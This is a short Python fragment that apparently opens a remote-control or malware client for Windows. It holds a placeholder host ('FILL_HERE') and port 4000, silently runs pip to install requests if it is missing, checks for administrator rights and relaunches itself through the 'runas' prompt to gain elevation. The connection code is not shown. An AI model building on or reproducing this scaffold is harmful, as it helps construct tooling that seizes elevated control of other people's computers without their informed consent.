host = 'FILL_HERE'
port = 4000

import sys
import os
import ctypes
try:
    import requests

except ImportError:
    os.system('pip3 install requests')

# get admin priv
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    pass

else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

